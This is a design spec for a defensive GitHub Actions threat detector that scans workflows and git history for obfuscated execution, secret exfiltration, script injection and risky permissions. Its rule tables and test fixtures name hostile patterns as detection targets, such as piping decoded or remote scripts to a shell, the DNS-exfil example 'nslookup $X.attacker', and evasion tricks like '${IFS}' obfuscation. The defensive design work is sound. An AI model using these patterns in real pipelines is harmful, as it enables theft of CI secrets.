# Design Spec — Workflow-Threat Engine (`workflow-audit`)

Date: 2026-06-04
Status: Approved design, pre-implementation
Author: brainstormed w/ Credence maintainer
Grounding: `.audit/FINDINGS-workflow-engine-2026-06-04.md` (design red-team, 13 evasion gaps) ·
`.audit/RESEARCH-workflow-engine-2026-06-04.md` (Tier-A research synthesis)

## BLUF
A new `credence workflow-audit` detector that scans GitHub Actions workflows — in **both the working tree
and full git history** — for poisoned-pipeline behaviour: obfuscated/runtime-decoded execution, secret
exfiltration, script injection, and dangerous trigger/permission blast radius. It is built **evasion-first**
(a job-scoped secret→sink taint pass, expanded decoder/sink sets, composite-action coverage, dangling-commit
recovery) and **low-FP** (combination rules + confidence model + visible-only suppression). Its novel
contribution vs. zizmor/poutine/actionlint is **git-history forensics + dangling-commit recovery + identity
enrichment** — mechanizing the originating incident's lesson that *deleting a workflow from `main` does not
erase its history*.

---

## 1. Motivation & threat model

Source incident (LinkedIn, 2026-06): a `.github/workflows/staging.yaml` step carried **base64-encoded bash,
decoded at runtime**, exfiltrating GitHub Actions secrets (tokens, env vars, cloud creds) to a remote host.
Committed under a generic `ci-bot` author, pushed from a **former contributor's account**
(*"identity on a commit is not intent"*). `workflow_dispatch` + broad permissions = high blast radius.
Deleting the workflow from `main` **did not erase git history** — past commits still required IR.

Detector-relevant lessons → pillars:
- **Pillar 1 — content threats:** a `run:` block is executable code; detect obfuscated exec + secret exfil.
- **Pillar 2 — history forensics:** the malicious commit persists after deletion; scan history, not just HEAD.
- **Pillar 3 — blast radius:** dangerous triggers + over-broad permissions + unpinned third-party actions.

Maps to OWASP **CICD-SEC-4** (Poisoned Pipeline Execution), **-3** (dependency chain), **-5** (insufficient
PBAC), **-6** (credential hygiene), **-7** (insecure config); MITRE **T1027/T1059** (obfuscation/exec),
**T1567/T1041** (exfil), **T1552** (unsecured creds), **T1195** (supply chain).

## 2. Scope & non-goals

**In scope (v1):**
- GitHub Actions **deep**, via a pluggable platform-adapter architecture (other platforms recognized by path,
  run a generic subset only — no GH-specific checks).
- Working-tree scan + **path-filtered full git-history** scan (incl. opt-in dangling/unreachable commits).
- Composite actions (`.github/actions/**/action.yml`), reusable workflows, and `run:`-referenced local scripts.
- 13 detection rules (§4), 13 baked-in evasion hardenings (§5), text/JSON/SARIF output, `--fail-on` gating.

**Non-goals (v1):**
- Equal-depth detection for GitLab/Jenkins/CircleCI/etc. (recognized, generic subset only).
- Runtime/egress monitoring (that is StepSecurity harden-runner's domain; we are static + local).
- Package dependency-confusion / SCA (already covered by `credence/supply_chain`).
- Typosquatted action names (overlaps existing `slopsquatting.py`) — v1.1 candidate.

**Design invariant:** the engine is **local-only, zero network egress** (stdlib + PyYAML + `git`). Unlike the
existing `cicd_scanner` (which makes HTTP requests to probe public exposure), `workflow-audit` never makes an
outbound call.

## 3. Architecture

New package `credence/workflow_audit/`, mirroring `credence/agent_exposure/`:

```
credence/workflow_audit/
  models.py      # Severity, Confidence enums; Workflow/Job/Step/Trigger/Permissions;
                 #   WorkflowFinding; WorkflowAuditResult
  parser.py      # parse_workflow(text) -> Workflow | None   (PyYAML safe_load; tokenizes run: blocks)
                 #   + parse_action(text) for composite action.yml
  normalize.py   # run-block normalization (F-010): strip line-continuations, collapse ${IFS}/quotes/
                 #   backslash-escapes, reuse invisible_unicode_detector before rule matching
  taint.py       # F-001/F-003: job-scoped binding & dataflow resolution ->
                 #   ResolvedStep view (secret-tainted vars, decode-to-file artifacts) for sink rules
  platforms.py   # adapter registry; GitHubActionsAdapter (deep). path globs + secret/context grammar
  rules/
    exec_rules.py    # WF-EXEC-001/002
    exfil_rules.py   # WF-EXFIL-001/002
    inject_rules.py  # WF-INJ-001/002
    config_rules.py  # WF-CFG-001..006
    __init__.py      # Rule protocol, registry, run_rules(resolved_view | raw_text, ctx)
  history.py     # Pillar 2: path-filtered `git log` over CI paths; reconstruct blob per commit;
                 #   attribute author/committer; identity flags; dedup to earliest; F-006 dangling sweep
  allowlist.py   # platform-native hosts; known-good installer domains; suppression parsing (F-007/F-008)
  scan.py        # orchestrator: working-tree pass + history pass -> WorkflowAuditResult
  report.py      # human-readable report
  sarif.py       # SARIF 2.1.0 (reuses agent_exposure/sarif.py conventions)
```

**Data flow.** `scan.py` discovers CI files + composite actions in the working tree (platform path globs) and
enumerates history commits touching those paths. For each source (working-tree file **or** historical blob):
`parser.parse_*` → structured model (or `None` → degraded line-scan, Approach C) → `normalize` run blocks →
`taint` builds the job-scoped resolved view → `rules.run_rules` over the resolved view. Findings carry
location (file/job/step/line) + severity + confidence + rule id + framework tags; history findings add
commit/author/committer/date + `identity_flags` + `persists_in_history_only`. Same-rule/same-normalized-step
findings across commits dedup to the **earliest introducing commit**.

**The taint pass (highest-leverage component).** FP-conscious single-step matching is low-FN-resistant. `taint.py`
resolves, **within a job**: (a) `env:` → secret bindings at workflow/job/step scope, so a `run:` referencing
`$VAR` is known to carry `secrets.PROD`; (b) decode-to-file flows (step A writes a decoded blob, step B
executes it). Sink rules (exfil/exec) evaluate over this resolved view, not one step's raw string. Resolves
F-001, F-003, and the F-004 dynamic-host case.

## 4. Detection rule catalog (13 rules)

All rules fire on **co-occurring conditions** (not lone tokens), over the **normalized + taint-resolved** view.
Severity drives `--fail-on`; confidence is reported, never auto-suppresses.

### Pillar 1 — content threats
| ID | Fires on | Sev | Conf | Frameworks |
|---|---|---|---|---|
| `WF-EXEC-001` | Runtime-decoded shell exec: a decoder (`base64 -d`/`--decode`, `base32`, `xxd -r`, `xxd -p -r`, `openssl enc -d`, `gzip -d`/`gunzip`, `tr` rotation, `rev`, `uudecode`, `printf '\x..'`, `gpg -d`) piped to a shell, OR `eval "$(…decoder…)"`, OR an interpreter executing decoded input (`python -c`/`node -e`/`perl -e`/`ruby -e` with a decode) — incl. cross-step decode-to-file via taint | High | High | CICD-SEC-4, T1027, T1059 |
| `WF-EXEC-002` | Remote script piped to shell — `curl`/`wget … \| (ba)?sh`. **High** if host not on installer allowlist & unpinned; **Info** if allowlisted installer | Med→High | Med | CICD-SEC-3/4, T1059 |
| `WF-EXFIL-001` | A **secret-tainted value** (resolved via `env:` bindings) reaches an **outbound sink** in the same job: HTTP client to non-allowlisted/non-platform host, **dynamic host** (`curl $H`), **platform-channel abuse** (POST to a *different* GitHub repo/gist/`repository_dispatch` via `api.github.com`), or **DNS exfil** (`nslookup $X.attacker`, `dig`, `host`) | High→Crit | High | CICD-SEC-4, T1567/T1041 |
| `WF-EXFIL-002` | Secret/env dump to network or log: `env`/`printenv`/`set` → outbound call; `echo "${{ secrets.* }}"` or echo of a secret-tainted var; `ACTIONS_STEP_DEBUG`/step-debug enabling secret-bearing log verbosity | High | High | CICD-SEC-6, T1552/T1567 |

### Pillar 1 — script injection
| ID | Fires on | Sev | Conf | Frameworks |
|---|---|---|---|---|
| `WF-INJ-001` | Untrusted context interpolated **directly** into `run:` (not bound via `env:`). Match = the **explicit 18-field list** (research-verified) **OR** the **suffix heuristic** (`github.event.*`/`github.*` ending in `body, default_branch, email, head_ref, label, message, name, page_name, ref, title`). Also applies to `actions/github-script` `script:` bodies (F-013) | High | High | CICD-SEC-4, T1059 |
| `WF-INJ-002` | Untrusted input (per above) written to `$GITHUB_ENV` / `$GITHUB_PATH` → env/PATH injection → code-exec | High | Med→High | CICD-SEC-4, T1059 |

### Pillar 2 — history forensics
| ID | Fires on | Sev | Conf | Frameworks |
|---|---|---|---|---|
| `WF-HIST-001` | Any High/Crit content/inject rule firing on a commit whose file is **absent from the working tree** → flagged `persists_in_history_only` (the "deletion ≠ erasure" IR item). Covers reachable **and** (opt-in) dangling/deleted-branch commits | inherit | inherit | CICD-SEC-4 |

*History pass otherwise re-runs all Pillar 1 & 3 rules over historical blobs and attaches `identity_flags`
(§6) as enrichment.*

### Pillar 3 — blast radius / misconfig
| ID | Fires on | Sev | Conf | Frameworks |
|---|---|---|---|---|
| `WF-CFG-001` | Privileged trigger (`pull_request_target`/`workflow_run`; lower-confidence: `issue_comment`/`issues`/`discussion(_comment)`/`schedule`/`workflow_call`) **+** checkout of a PR-controlled ref (`github.event.pull_request.head.*`, `github.head_ref`, explicit PR fetch) | High | High (canonical 2) / Med (extended) | CICD-SEC-4, T1195 |
| `WF-CFG-002` | Excessive permissions: `write-all`, `id-token: write` + `contents: write`, or no `permissions:` block (inherits broad default) | Med | High | CICD-SEC-5 |
| `WF-CFG-003` | Unpinned/untrusted third-party action: `@<branch>`=Med, `@<tag>`=Low, `docker://…`=Med, **SHA-pinned-but-impostor** (SHA not in claimed repo network, best-effort)=Med; SHA-pinned-known-owner=clean | Low→Med | Med | CICD-SEC-3, T1195.2 |
| `WF-CFG-004` | `runs-on: self-hosted` **+** fork/`pull_request_target` trigger | Med→High | Med | CICD-SEC-7 |
| `WF-CFG-005` | `artipacked`: `actions/checkout` with credentials persisted (default `persist-credentials: true`) **+** workspace/`.git` uploaded via `upload-artifact` | Med→High | Med | CICD-SEC-6, T1552 |
| `WF-CFG-006` | `secrets: inherit` to a reusable workflow, or a job granted all repo secrets (over-sharing) | Med | Med | CICD-SEC-5 |

`workflow_dispatch` alone is deliberately **Info context only**, never a finding.

## 5. Evasion hardenings (baked in)

Each maps to a red-team finding (`.audit/FINDINGS-workflow-engine-2026-06-04.md`):

| # | Hardening | Where |
|---|---|---|
| F-001 | Cross-step decode-to-file → job-scoped taint dataflow | `taint.py`, `WF-EXEC-001` |
| F-002 | Expanded decoder + interpreter set (base32/xxd/openssl/gzip/tr/rev/uudecode/printf/gpg; `python -c`/`node -e`/`perl -e`/`ruby -e`) | `WF-EXEC-001` |
| F-003 | `env:`→secret binding resolution (the normal secret flow) | `taint.py`, `WF-EXFIL-001/002` |
| F-004 | Exfil sinks: DNS, dynamic host, platform-channel-to-foreign-repo; platform allowlist ≠ blanket trust | `WF-EXFIL-001` |
| F-005 | Parse composite `action.yml`, reusable workflows, and `run: ./script` local-script references | `parser.py`, `scan.py` |
| F-006 | Dangling/unreachable-commit sweep (`--include-unreachable` → `git reflog` + `git fsck --lost-found`) | `history.py` |
| F-007 | Suppression is **visible-only**; never honored for High/Crit exec/exfil/inj; **same-commit suppression** of a silenced pattern is its own signal | `allowlist.py` |
| F-008 | Repo-resident allowlist not trusted for gating by default; allowlist diffs flagged | `allowlist.py` |
| F-009 | Parse failure on a file GitHub will still execute = **High finding (fail loud)**; config rules never silently skipped | `parser.py`, `scan.py` |
| F-010 | Run-block normalization (IFS/brace-split/backslash-newline/invisible-unicode) before matching | `normalize.py` |
| F-011 | Expanded privileged-trigger taxonomy + checkout-ref expression variants | `WF-CFG-001` |
| F-012 | Pinning ≠ trust: `docker://` + impostor-commit (SHA not in claimed repo network) | `WF-CFG-003` |
| F-013 | `actions/github-script` `script:` body analyzed as code | `WF-INJ-001`, `parser.py` |

## 6. Confidence, FP, allowlist & identity model

- **Severity** (`critical`/`high`/`medium`/`low`/`info`) drives `--fail-on` (default `high`).
- **Confidence** (`high`/`medium`/`low`) reported, never auto-suppresses.
- **Allowlists:** platform-native hosts (`api.github.com` *for same-repo ops only*, `ghcr.io`,
  `objects.githubusercontent.com`, …) never count as exfil targets; known-good installer domains
  (`get.docker.com`, `sh.rustup.rs`, `deb.nodesource.com`, …) downgrade `WF-EXEC-002` to Info. User-extensible
  via `--allow-host` and `.credence/workflow-allowlist.yml` (the latter **not trusted for gating** by default; diffs flagged).
- **Suppression — visible, not silent** (v0.8.1 lesson): `# credence:ignore <RULE> reason=…` moves a finding
  to a "suppressed" report section + SARIF `suppressions[]`; never deletes it. `--fail-on` skips suppressed by
  default; `--count-suppressed` re-arms. High/Crit exec/exfil/inj rules **ignore** inline suppression entirely.
- **Identity as context, never a verdict** (*"identity is not intent"*): history findings may carry
  `identity_flags` (`author≠committer`, `bot_authored_content_change`,
  `first_time_contributor_touching_workflows`, `author_email_domain_anomaly`). These **enrich** a content
  finding and bump its **confidence annotation** for analyst review; they **never** create a standalone finding
  or raise **severity**.

## 7. CLI surface

```
credence workflow-audit [PATH]              # default "."
  --history / --no-history                   # history pass (default: on)
  --include-unreachable                      # also walk reflog + dangling commits (F-006)
  --since <date> | --max-commits <n>         # bound the history walk
  --allow-host <host>      (repeatable)
  --disable-rule <ID>      (repeatable)
  --format text|json|sarif                   # default text
  -o, --output <file>
  --fail-on <severity>                       # default "high" (shared cli_gating)
  --count-suppressed                         # re-arm suppressed findings for gating
```
Wired into `full-audit` with default bounds (history on, path-filtered, `--include-unreachable` off) so the
aggregate sweep stays fast.

## 8. Output & gating

- **Text:** grouped pillar→severity; each finding shows `file:job:step`, rule id, CICD-SEC + MITRE tags, a
  one-line remediation, and (history) commit/author + `identity_flags`. Suppressed findings in a trailing section.
- **SARIF 2.1.0:** each rule → `reportingDescriptor` with `properties.tags` = CICD-SEC/MITRE IDs;
  `partialFingerprints` for cross-run dedup (v0.8 convention); `suppressions[]` for suppressed items; history
  findings use the working-tree file location when present, else a logical location noting the commit.
- **JSON:** structured findings for tooling.
- **Gating:** reuse `cli_gating.py`; non-zero exit when any non-suppressed finding ≥ `--fail-on`.

## 9. Data model (`models.py`)

`Severity`/`Confidence` enums. `WorkflowFinding`: `rule_id`, `title`, `severity`, `confidence`, `platform`,
`file_path`, `job`, `step_index`/`step_name`, `line`, `snippet`, `frameworks` (`cicd_sec: [...]`, `mitre: [...]`),
`remediation`, `source` (`working_tree`|`history`), `commit`/`commit_short`/`author`/`committer`/`commit_date`
(history), `identity_flags: [...]`, `persists_in_history_only: bool`, `suppressed: bool` + `suppression_reason`,
`fingerprint`. `WorkflowAuditResult`: `findings`, severity/confidence counts, `scanned_files`, `scanned_commits`,
`scanned_unreachable`.

## 10. Testing strategy

Built via `subagent-driven-development` (TDD, Sonnet subagents — per project convention).
- **Per-rule positive + negative fixtures.** Negatives guard FP: `curl get.docker.com | bash`→Info;
  `env:`-bound `github.event.*`→no `WF-INJ-001`; normal secret deploy→no exfil; SHA-pinned known action→clean.
- **Evasion regression fixtures** — one per hardening F-001..F-013 (cross-step decode; `python -c` decode;
  env-mapped exfil; DNS exfil; payload-in-composite-action; malformed-YAML-GitHub-still-runs; same-commit
  suppression; `${IFS}` obfuscation; `$GITHUB_ENV` injection; `secrets: inherit`; `docker://`; github-script body).
- **Golden end-to-end:** fixture repo where a malicious workflow is committed then deleted →
  `WF-HIST-001 persists_in_history_only` fires; a second variant on a **deleted branch** →
  fires only under `--include-unreachable`.
- **Degraded-parse:** malformed YAML still catches exec/exfil via line-scan AND emits the fail-loud finding.
- **SARIF schema validation** (mirrors `agent_exposure` SARIF tests).
- **Untrusted-context fixture** built directly from the research-verified 18-field list + suffix cases.

## 11. Prior art & differentiation

Static GHA analyzers (zizmor — 38 audits; poutine — 13 rules; actionlint; StepSecurity harden-runner —
runtime) are all **present-state**: they inspect the working tree (or runtime), never history. Credence's
non-overlapping contributions:
1. **Pillar 2 git-history forensics + dangling/unreachable-commit recovery (F-006)** — no comparable tool
   walks deleted-branch/reflog objects; direct mechanization of "deletion ≠ erasure."
2. **Identity-as-context enrichment** on history findings.
3. **Job-scoped secret→sink taint** (F-003) tying env-resolved secrets to exfil sinks.
4. **Zero-egress local tool** inside a unified exposure-intelligence scanner (workflow threats alongside
   secret / supply-chain / AI-infra detection).

Our rule overlaps (template-injection, dangerous-triggers, excessive-permissions, unpinned-uses,
self-hosted-runner, obfuscation, impostor-commit) are *independently corroborated* by zizmor/poutine — a
coverage validation, not a novelty claim.

## 12. Known limitations & boundary statement

- GitHub Actions only at depth; other platforms recognized but shallow.
- The explicit 18-field untrusted-input list may lag new GitHub event types; the suffix heuristic is the hedge,
  but novel event payloads could evade until the list is refreshed (verify against GitHub docs in fixtures).
- Impostor-commit detection is best-effort without network (zero-egress invariant) — limited to local object
  data; full repo-network verification would require network and is out of scope.
- PyYAML vs GitHub's lenient YAML parser can differ; mitigated by fail-loud-on-unparseable, not eliminated.
- Dangling-commit recovery depends on local object/reflog retention; gc'd objects are unrecoverable.
- Detection is static: a payload fetched entirely at runtime from a first-seen dynamic source with no local
  indicators can still evade. Pairs with (not replaces) runtime egress monitoring.

## 13. Suggested implementation phasing (for the plan)

1. `models.py` + `parser.py` (+ `parse_action`) + `platforms.py` (GH adapter) — structured model & discovery.
2. `normalize.py` + `taint.py` — the resolved view (unblocks low-FP/low-FN rules).
3. `rules/` — exec → exfil → inject → config, each with positive+negative fixtures (TDD).
4. `history.py` — path-filtered walk, dedup, identity flags; then `--include-unreachable`.
5. `allowlist.py` — hosts, installer downgrade, visible suppression.
6. `scan.py` orchestrator + `report.py` + `sarif.py` + `cli` wiring + `full-audit` integration + `--fail-on`.
7. Golden e2e + SARIF schema tests; docs + CHANGELOG.

## Boundary statement
This spec covers a static, local, zero-egress GitHub Actions threat detector with git-history forensics. It
does not address other CI platforms at depth, runtime monitoring, or package-level SCA (covered elsewhere in
Credence). Detection facts (untrusted-context taxonomy, privileged triggers) are Tier-A-verified as of
2026-06-04; re-verify against GitHub docs at implementation time. Prior-art differentiation is current as of
2026-06 and may erode as those tools evolve.
